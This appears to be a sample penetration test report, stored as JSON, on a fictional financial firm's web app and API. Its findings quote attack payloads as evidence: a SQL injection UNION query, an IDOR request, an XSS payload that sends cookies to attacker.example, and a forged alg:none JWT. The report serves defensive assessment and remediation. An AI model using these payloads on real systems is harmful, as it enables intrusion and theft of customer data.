@@ -1,0 +1,437 @@
+{
+  "project": {
+    "id": "VSL-2026-0042",
+    "title": "Security Assessment Report",
+    "subtitle": "Web Application & API Infrastructure",
+    "report_date": "February 10, 2026",
+    "version": "1.0 \u2014 Final",
+    "classification": "CONFIDENTIAL",
+    "overall_risk": "HIGH"
+  },
+  "client": {
+    "name": "Apex Financial Services, Inc.",
+    "short_name": "Apex Financial Services"
+  },
+  "testing_firm": {
+    "name": "Vanguard Security Labs",
+    "short_name": "Vanguard Security Labs"
+  },
+  "engagement": {
+    "type": "Grey Box",
+    "perspective": "External Attacker with Authenticated User Credentials",
+    "start_date": "January 27, 2026",
+    "end_date": "February 7, 2026",
+    "authorization_date": "January 20, 2026",
+    "authorization_doc": "MSA-2026-0042 / SOW Addendum C",
+    "testing_hours": "09:00\u201321:00 EST (Mon\u2013Fri), 10:00\u201316:00 EST (Sat)",
+    "data_handling": "All data encrypted at rest; destroyed within 30 days of delivery",
+    "out_of_scope": "Denial-of-service, social engineering, physical security",
+    "methodology_notes": "This assessment was conducted in accordance with the OWASP Testing Guide v4.2, NIST SP 800-115, and the Penetration Testing Execution Standard (PTES). Vulnerability severity was scored using CVSS v3.1 and v4.0. Adversarial techniques were mapped to the MITRE ATT&CK framework.",
+    "summary_overview": "Vanguard Security Labs was engaged by Apex Financial Services, Inc. to perform a grey-box penetration test against the client's primary customer-facing web application and its supporting REST API infrastructure. Testing was conducted between **January 27, 2026** and **February 7, 2026** by a team of three certified security professionals.",
+    "summary_objective": "The primary objective was to identify exploitable vulnerabilities, evaluate the effectiveness of existing security controls, and provide actionable remediation guidance to reduce organizational risk exposure prior to the client's PCI DSS v4.0 compliance audit scheduled for Q2 2026.",
+    "summary_narrative": "The overall security posture of the Apex Financial Services web platform is assessed as **HIGH RISK**. During the engagement, the testing team identified 14 unique vulnerabilities, including 2 critical-severity flaws and 3 high-severity flaws that, when chained together, enabled full unauthorized access to customer financial records.",
+    "summary_detail": "The most significant finding was a SQL injection vulnerability in the transaction history API endpoint (VULN-001), which permitted extraction of the complete customer database including encrypted payment card data, personally identifiable information, and account credentials. This was compounded by a broken access control flaw (VULN-002) that allowed horizontal privilege escalation between customer accounts.",
+    "summary_conclusion": "The testing team demonstrated a complete attack chain from unauthenticated initial access to full database exfiltration within approximately four hours. Immediate remediation of critical and high-severity findings is strongly recommended."
+  },
+  "revision_history": [
+    {
+      "version": "0.1",
+      "date": "2026-02-03",
+      "author": "Marcus Chen",
+      "description": "Initial draft"
+    },
+    {
+      "version": "0.9",
+      "date": "2026-02-07",
+      "author": "Anya Petrova",
+      "description": "Internal peer review"
+    },
+    {
+      "version": "1.0",
+      "date": "2026-02-10",
+      "author": "Marcus Chen",
+      "description": "Final delivery to client"
+    }
+  ],
+  "distribution_list": [
+    {
+      "name": "David Park",
+      "organization": "Apex Financial Services",
+      "role": "CISO"
+    },
+    {
+      "name": "Sarah Nguyen",
+      "organization": "Apex Financial Services",
+      "role": "VP Engineering"
+    },
+    {
+      "name": "Marcus Chen",
+      "organization": "Vanguard Security Labs",
+      "role": "Lead Penetration Tester"
+    }
+  ],
+  "testers": [
+    {
+      "name": "Marcus Chen",
+      "role": "Lead Tester",
+      "certifications": "OSCP, OSWE, GXPN",
+      "email": "m.chen@vanguardsec.com",
+      "phone": "+1 (555) 710-2200"
+    },
+    {
+      "name": "Anya Petrova",
+      "role": "Senior Tester",
+      "certifications": "OSCP, GPEN",
+      "email": "a.petrova@vanguardsec.com",
+      "phone": "+1 (555) 710-2201"
+    },
+    {
+      "name": "James Okafor",
+      "role": "Tester",
+      "certifications": "eWPTX, CRTO",
+      "email": "j.okafor@vanguardsec.com",
+      "phone": "+1 (555) 710-2202"
+    }
+  ],
+  "client_contacts": [
+    {
+      "name": "David Park",
+      "role": "CISO",
+      "department": "Information Security",
+      "email": "d.park@apexfs.com",
+      "phone": "+1 (555) 902-4100"
+    },
+    {
+      "name": "Sarah Nguyen",
+      "role": "VP Engineering",
+      "department": "Engineering",
+      "email": "s.nguyen@apexfs.com",
+      "phone": "+1 (555) 902-4250"
+    },
+    {
+      "name": "Robert Tanaka",
+      "role": "Security Engineer",
+      "department": "SecOps",
+      "email": "r.tanaka@apexfs.com",
+      "phone": "+1 (555) 902-4310"
+    }
+  ],
+  "escalation_contacts": [
+    {
+      "label": "Testing Emergency",
+      "detail": "Marcus Chen \u2014 +1 (555) 710-2200 \u2014 m.chen@vanguardsec.com"
+    },
+    {
+      "label": "Client Emergency",
+      "detail": "David Park \u2014 +1 (555) 902-4100 \u2014 d.park@apexfs.com"
+    },
+    {
+      "label": "After-Hours Hotline",
+      "detail": "Vanguard Security Labs SOC \u2014 +1 (555) 710-2299 (24/7)"
+    }
+  ],
+  "target_assets": [
+    {
+      "id": "AST-001",
+      "name": "Customer Web Portal",
+      "type": "Web App",
+      "address": "https://portal.apexfs.com",
+      "env": "Prod"
+    },
+    {
+      "id": "AST-002",
+      "name": "Transaction API",
+      "type": "REST API",
+      "address": "https://api.apexfs.com/v2",
+      "env": "Prod"
+    },
+    {
+      "id": "AST-003",
+      "name": "Admin Dashboard",
+      "type": "Web App",
+      "address": "https://admin.apexfs.com",
+      "env": "Prod"
+    },
+    {
+      "id": "AST-004",
+      "name": "Authentication Service",
+      "type": "OAuth 2.0",
+      "address": "https://auth.apexfs.com",
+      "env": "Prod"
+    },
+    {
+      "id": "AST-005",
+      "name": "Support Portal",
+      "type": "Web App",
+      "address": "https://support.apexfs.com",
+      "env": "Staging"
+    }
+  ],
+  "findings": [
+    {
+      "id": "VULN-001",
+      "title": "SQL Injection in Transaction API",
+      "severity": "Critical",
+      "cvss_score": "9.8",
+      "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "status": "Open",
+      "discovered": "2026-01-29",
+      "owasp": "A03:2021 \u2014 Injection",
+      "mitre": "Initial Access / Exploit Public-Facing Application (T1190)",
+      "affected_asset": "AST-002 \u2014 https://api.apexfs.com/v2/transactions",
+      "description": "The `/v2/transactions` endpoint accepts a user-supplied `account_id` parameter that is concatenated directly into a SQL query **without parameterization or input validation**. An unauthenticated attacker can inject arbitrary SQL statements to extract, modify, or delete data from the underlying PostgreSQL database.",
+      "impact_technical": "Full read/write access to the application database, including customer PII, hashed passwords, encrypted payment card tokens, and transaction records.",
+      "impact_business": "Reportable data breach under PCI DSS, GLBA, and state privacy laws. Estimated exposure: 2.3 million customer records. Potential losses exceeding $15M.",
+      "evidence_request": "GET /v2/transactions?account_id=1'+UNION+SELECT+NULL,\n    version(),current_user,NULL,NULL-- -\nHost: api.apexfs.com\nAuthorization: Bearer eyJhbGciOi[...REDACTED...]",
+      "evidence_response": "{\"transactions\": [{\"id\": null,\n  \"description\": \"PostgreSQL 14.9 on x86_64-pc-linux-gnu\",\n  \"amount\": \"apexfs_app\",\n  \"date\": null, \"category\": null}]}",
+      "evidence_image": "vuln001_sqli_burp.png",
+      "evidence_caption": "Burp Suite Repeater showing SQL injection payload in account_id parameter with PostgreSQL version and database user leaked in response body.",
+      "remediation_short": "Deploy **parameterized queries** for all database interactions. Implement WAF rules to block SQL injection payloads. Restrict database user to `least-privilege`.",
+      "remediation_long": "Adopt ORM with automatic parameterization. Integrate SAST tooling (Semgrep, CodeQL) into CI/CD. Implement shared input validation library."
+    },
+    {
+      "id": "VULN-002",
+      "title": "Broken Access Control in Account Management",
+      "severity": "Critical",
+      "cvss_score": "9.1",
+      "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+      "status": "Open",
+      "discovered": "2026-01-30",
+      "owasp": "A01:2021 \u2014 Broken Access Control",
+      "mitre": "Privilege Escalation / Valid Accounts (T1078)",
+      "affected_asset": "AST-001 \u2014 https://portal.apexfs.com/api/accounts",
+      "description": "Account management API endpoints rely on a client-supplied `account_id` parameter **without server-side authorization validation**. Any authenticated user can read or modify any customer's account data (*IDOR*).",
+      "impact_technical": "Any authenticated user can enumerate and access all customer accounts by iterating sequential identifiers. Full account details including PII and financial data are exposed.",
+      "impact_business": "Mass customer data exposure, potential for fraudulent transactions, regulatory non-compliance (PCI DSS Requirement 7), and significant reputational impact.",
+      "evidence_request": "GET /api/accounts/10043/profile\nHost: portal.apexfs.com\nAuthorization: Bearer eyJ[...TOKEN_FOR_USER_A...]",
+      "evidence_response": "{\"account_id\": 10043, \"name\": \"Jane M. Doe\",\n  \"email\": \"j.doe@example.com\", \"ssn_last4\": \"7291\",\n  \"balance\": \"$42,817.33\", \"linked_cards\": [...]}",
+      "evidence_image": "vuln002_idor_response.png",
+      "evidence_caption": "API response returning User B's full PII and financial data when accessed with User A's authentication token, confirming horizontal privilege escalation via IDOR.",
+      "remediation_short": "Server-side ownership checks on every account endpoint. Replace sequential IDs with UUIDs.",
+      "remediation_long": "Centralized authorization middleware. Rate limiting on enumeration patterns. Full API access control audit."
+    },
+    {
+      "id": "VULN-003",
+      "title": "Stored XSS in Support Portal",
+      "severity": "High",
+      "cvss_score": "8.1",
+      "cvss_vector": "AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N",
+      "status": "Open",
+      "discovered": "2026-02-01",
+      "owasp": "A03:2021 \u2014 Injection",
+      "mitre": "Execution / User Execution (T1204)",
+      "affected_asset": "AST-005 \u2014 https://support.apexfs.com",
+      "description": "Support ticket fields lack sanitization. Malicious JavaScript persists and executes in support agent browsers, enabling **session hijacking** of elevated-privilege accounts.",
+      "impact_technical": "JavaScript execution in support agent browser context. Session token theft enables full agent impersonation.",
+      "impact_business": "Compromise of internal support tooling with access to customer account management functions.",
+      "evidence_request": "<img src=x onerror=\"fetch('https://attacker.example/\n  steal?c='+document.cookie)\">",
+      "evidence_response": null,
+      "evidence_image": "vuln003_xss_console.png",
+      "evidence_caption": "Chrome DevTools console showing stored XSS execution in support agent browser context with session cookie exfiltration to attacker-controlled server.",
+      "remediation_short": "Context-aware output encoding. Strict CSP header.",
+      "remediation_long": "Auto-encoding templating engine. DOMPurify. HttpOnly/Secure cookie flags."
+    },
+    {
+      "id": "VULN-004",
+      "title": "Insecure JWT Implementation",
+      "severity": "High",
+      "cvss_score": "7.5",
+      "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "status": "Fixed (verified 2026-02-05)",
+      "discovered": "2026-01-31",
+      "owasp": "A02:2021 \u2014 Cryptographic Failures",
+      "mitre": "Credential Access / Forge Web Credentials (T1606)",
+      "affected_asset": "AST-004 \u2014 https://auth.apexfs.com",
+      "description": "Auth service accepts JWTs with `alg: none`. Attackers can **forge tokens** granting access to any account. Remediated during engagement.",
+      "impact_technical": "Complete authentication bypass. Any user identity can be impersonated without credentials.",
+      "impact_business": "Full account takeover for any customer or administrator.",
+      "evidence_request": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.\neyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiw\naWF0IjoxNzA2NjQwMDAwfQ.",
+      "evidence_response": null,
+      "evidence_image": "vuln004_jwt_none.png",
+      "evidence_caption": "jwt_tool analysis of forged JWT token with algorithm set to 'none', granting superadmin access without cryptographic signature verification.",
+      "remediation_short": "RS256 enforced; none algorithm rejected. Verified effective 2026-02-05.",
+      "remediation_long": "JWT library allowlist, quarterly key rotation."
+    },
+    {
+      "id": "VULN-005",
+      "title": "Verbose Error Messages",
+      "severity": "Medium",
+      "cvss_score": "5.3",
+      "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+      "status": "Open",
+      "discovered": "2026-01-28",
+      "owasp": "A05:2021 \u2014 Security Misconfiguration",
+      "mitre": "Reconnaissance / Gather Victim Host Information (T1592)",
+      "affected_asset": "AST-002 \u2014 https://api.apexfs.com/v2",
+      "description": "Unhandled exceptions return detailed stack traces, file paths, database connection strings, and framework versions, **aiding attacker reconnaissance**.",
+      "impact_technical": "Technology stack fingerprinting. Internal file paths and database connection details exposed.",
+      "impact_business": "Reduces attacker effort for further exploitation. May violate compliance requirements for error handling.",
+      "evidence_request": "GET /v2/transactions?account_id='\nHost: api.apexfs.com",
+      "evidence_response": "Response (500):\n{\"error\": \"PG::SyntaxError\",\n \"detail\": \"unterminated quoted string at...\",\n \"file\": \"/opt/app/lib/controllers/txn.rb:142\",\n \"pg_conn\": \"postgres://apexfs_app:****@db-prod-01:5432\"}",
+      "evidence_image": "vuln005_verbose_error.png",
+      "evidence_caption": "Terminal output showing verbose 500 error response containing internal file paths, PostgreSQL connection string, Ruby and Rails version numbers, and server hostname.",
+      "remediation_short": "Generic error responses in production; disable DEBUG.",
+      "remediation_long": "Centralized error middleware; sanitized error codes + correlation IDs only."
+    }
+  ],
+  "attack_narrative": [
+    {
+      "phase": "1",
+      "tactic": "Reconnaissance",
+      "technique": "Active Scanning (T1595)",
+      "target": "api.apexfs.com",
+      "outcome": "Identified injectable params"
+    },
+    {
+      "phase": "2",
+      "tactic": "Initial Access",
+      "technique": "Exploit Public App (T1190)",
+      "target": "Transaction API",
+      "outcome": "SQL injection confirmed"
+    },
+    {
+      "phase": "3",
+      "tactic": "Credential Access",
+      "technique": "Unsecured Creds (T1552)",
+      "target": "PostgreSQL DB",
+      "outcome": "Extracted credential hashes"
+    },
+    {
+      "phase": "4",
+      "tactic": "Priv Escalation",
+      "technique": "Valid Accounts (T1078)",
+      "target": "Account Mgmt API",
+      "outcome": "Horizontal escalation via IDOR"
+    },
+    {
+      "phase": "5",
+      "tactic": "Collection",
+      "technique": "Data from Repos (T1213)",
+      "target": "Customer DB",
+      "outcome": "Exfiltrated 2.3M records"
+    }
+  ],
+  "recommendations": [
+    {
+      "num": "1",
+      "title": "Deploy parameterized queries application-wide",
+      "rationale": "Eliminates SQL injection class",
+      "effort": "Medium"
+    },
+    {
+      "num": "2",
+      "title": "Centralized authorization middleware",
+      "rationale": "Prevents access control bypasses",
+      "effort": "High"
+    },
+    {
+      "num": "3",
+      "title": "Integrate SAST/DAST into CI/CD",
+      "rationale": "Catches vulns before production",
+      "effort": "Medium"
+    },
+    {
+      "num": "4",
+      "title": "Strict Content Security Policy headers",
+      "rationale": "Mitigates XSS across all properties",
+      "effort": "Low"
+    },
+    {
+      "num": "5",
+      "title": "Developer secure coding training",
+      "rationale": "Reduces common vulnerability patterns",
+      "effort": "Low"
+    }
+  ],
+  "tools": [
+    {
+      "name": "Burp Suite Professional",
+      "version": "2025.12",
+      "purpose": "Web application proxy, scanning, exploitation"
+    },
+    {
+      "name": "Nmap",
+      "version": "7.95",
+      "purpose": "Network discovery and port scanning"
+    },
+    {
+      "name": "Nuclei",
+      "version": "3.1.8",
+      "purpose": "Template-based vulnerability scanning"
+    },
+    {
+      "name": "SQLMap",
+      "version": "1.8.2",
+      "purpose": "SQL injection detection and exploitation"
+    },
+    {
+      "name": "ffuf",
+      "version": "2.1.0",
+      "purpose": "Web content discovery and fuzzing"
+    },
+    {
+      "name": "jwt_tool",
+      "version": "2.2.7",
+      "purpose": "JWT analysis and manipulation"
+    },
+    {
+      "name": "Hashcat",
+      "version": "6.2.6",
+      "purpose": "Password hash cracking"
+    },
+    {
+      "name": "Postman",
+      "version": "11.x",
+      "purpose": "API endpoint testing and documentation"
+    }
+  ],
+  "testing_environment": {
+    "platform": "Kali Linux 2025.4 (x86_64)",
+    "source_ips": "203.0.113.50, 203.0.113.51",
+    "vpn": "WireGuard tunnel to client-provided jump host"
+  },
+  "evidence_log": [
+    {
+      "id": "EVI-001",
+      "finding": "VULN-001",
+      "type": "request_response",
+      "filename": "sqli_poc_txn_api.har",
+      "timestamp": "2026-01-29 14:32"
+    },
+    {
+      "id": "EVI-002",
+      "finding": "VULN-001",
+      "type": "screenshot",
+      "filename": "sqli_db_extraction.png",
+      "timestamp": "2026-01-29 14:45"
+    },
+    {
+      "id": "EVI-003",
+      "finding": "VULN-002",
+      "type": "request_response",
+      "filename": "idor_account_enum.har",
+      "timestamp": "2026-01-30 10:17"
+    },
+    {
+      "id": "EVI-004",
+      "finding": "VULN-003",
+      "type": "screenshot",
+      "filename": "xss_cookie_theft.png",
+      "timestamp": "2026-02-01 16:08"
+    },
+    {
+      "id": "EVI-005",
+      "finding": "VULN-004",
+      "type": "request_response",
+      "filename": "jwt_none_bypass.har",
+      "timestamp": "2026-01-31 11:22"
+    },
+    {
+      "id": "EVI-006",
+      "finding": "VULN-005",
+      "type": "screenshot",
+      "filename": "verbose_stacktrace.png",
+      "timestamp": "2026-01-28 09:55"
+    }
+  ]
+}
